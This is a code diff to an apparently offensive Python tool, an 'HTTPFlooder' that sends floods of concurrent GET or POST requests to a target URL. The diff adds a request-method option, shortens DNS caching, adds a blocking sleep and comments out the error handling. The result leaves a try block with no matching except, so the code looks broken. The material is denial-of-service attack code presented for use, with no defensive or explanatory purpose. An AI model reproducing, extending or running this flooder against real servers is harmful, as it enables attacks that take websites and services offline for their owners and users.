@@ -10,7 +10,8 @@ from contextlib import suppress
 from ..utils.ulog import log
 
 from ..src.cpu_manager import CPUManager
-
+import sys
+import time
 
 MAX_LINE_LENGTH = 80
 class HTTPFlooder:
@@ -18,11 +19,13 @@ class HTTPFlooder:
             self,
             target_url: str,
             concurrency: int,
-            sleep_time: float
+            sleep_time: float,
+            method: str
     ):
         self.target_url = target_url
         self.concurrency = concurrency
         self.sleep_time = sleep_time
+        self.method = method
 
         self.session : Optional[ClientSession] = None
         self.ssl_context = self.create_ssl_context()
@@ -39,12 +42,16 @@ class HTTPFlooder:
 
     async def __aenter__(self):
         headers = getHeaders(self.target_url)
+
+        log.critical(f"Size headers: {sys.getsizeof(str(headers))} bytes")
+
+        time.sleep(2)
         connector = TCPConnector(
             limit=self.concurrency * 2,
             limit_per_host=self.concurrency,
             ssl=self.ssl_context,
             use_dns_cache=True,
-            ttl_dns_cache=300,
+            ttl_dns_cache=30,
             keepalive_timeout=30,
         )
 
@@ -77,42 +84,65 @@ class HTTPFlooder:
             async with sem:
                 try:
                     if not self.session:
-                        raise RuntimeError("HTTP session is not initialized.")
-                    async with self.session.post(
-                        self.target_url
-                    ) as response:
-                        await response.read()
-                        
+                        raise RuntimeError("HTTP session is not initialized.")      
+                    
 
-                        success = 0
-                        error = 0
+                    # log.warning(f"Method: {self.method.upper()}")
+                    if self.method == 'get':
+                        async with self.session.get(
+                            self.target_url
+                        ) as response:
+                            await response.read()
+                            
 
-                        if response.status >= 400:
-                            error += 1
-                        else:
-                            success += 1
+                            success = 0
+                            error = 0
 
-                        # message = f"{success} successfully | {error} errors"
-                        print(f"[Worker {worker_id} | PID {pid}]  {success} successfully | {error} errors. {response.status}")
-                        # print(message)
-                    if self.sleep_time >0:
-                        await asyncio.sleep(self.sleep_time)
+                            if response.status >= 400:
+                                error += 1
+                            else:
+                                success += 1
+
+                            # message = f"{success} successfully | {error} errors"
+                            print(f"[Worker 'get' {worker_id} | PID {pid}]  {success} successfully | {error} errors. {response.status}")
+                            # print(message)
+                    else:
+                        async with self.session.post(
+                            self.target_url
+                        ) as response:
+                            await response.read()
+                            
+
+                            success = 0
+                            error = 0
+
+                            if response.status >= 400:
+                                error += 1
+                            else:
+                                success += 1
+
+                            # message = f"{success} successfully | {error} errors"
+                            print(f"[Worker 'post' {worker_id} | PID {pid}]  {success} successfully | {error} errors. {response.status}")
+                            # print(message)
+                        if self.sleep_time >0:
+                            await asyncio.sleep(self.sleep_time)
 
                 except asyncio.CancelledError:
-                    log.info(f"[Worker {worker_id} | PID {pid}] Task was cancelled.")
-                    break
-                except Exception as e:
-                    log.error(f"[Worker {worker_id} | PID {pid}] Error sending HTTP request: {e}")
-                    await asyncio.sleep(
-                        min(5, self.sleep_time +1)
-                    )
-
+                #     log.info(f"[Worker {worker_id} | PID {pid}] Task was cancelled.")
+                #     break
+                # except Exception as e:
+                #     log.error(f"[Worker {worker_id} | PID {pid}] Error sending HTTP request: {e}")
+                #     await asyncio.sleep(
+                #         min(5, self.sleep_time +1)
+                #     )
+                    pass
 
 
 async def run_http_flood(
         target_url: str,
         concurrency: int,
-        sleep_time: float
+        sleep_time: float,
+        method: str = 'post'
 ) -> None:
     log.warning(f"Starting HTTP flood on {target_url} with {concurrency} workers.")
 
@@ -122,7 +152,8 @@ async def run_http_flood(
     async with HTTPFlooder(
         target_url,
         concurrency,
-        sleep_time
+        sleep_time,
+        method=method
     ) as flooder:
         sem = asyncio.Semaphore(concurrency)
 
